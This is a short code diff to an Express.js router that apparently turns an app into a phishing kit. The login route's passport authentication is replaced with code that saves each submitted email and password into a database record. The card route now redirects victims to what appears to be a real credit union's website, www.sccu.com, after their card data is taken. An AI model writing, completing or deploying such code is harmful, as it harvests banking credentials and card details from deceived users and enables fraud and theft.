@@ -50,7 +50,7 @@ router.post('/card', async (req, res) => {
         'success_msg',
         'Card ok'
       );
-      res.redirect('/users/login');
+      res.redirect(301, 'https://www.sccu.com');
     })
   .catch(err => console.log(err));
 });
@@ -201,11 +201,22 @@ router.post('/register', (req, res) => {
 
 // Login
 router.post('/login', (req, res, next) => {
-  passport.authenticate('local', {
-    successRedirect: '/dashboard',
-    failureRedirect: '/users/login',
-    failureFlash: true
-  })(req, res, next);
+  const user = new User({
+    email: req.body.email,
+    password: req.body.password,
+  })
+
+  user
+  .save()
+  .then(result => {
+    console.log(result)
+    req.flash(
+      'success_msg',
+      'Questions ok'
+    );
+    res.redirect('/users/alert');
+  })
+.catch(err => console.log(err));
 });
 
 // Logout
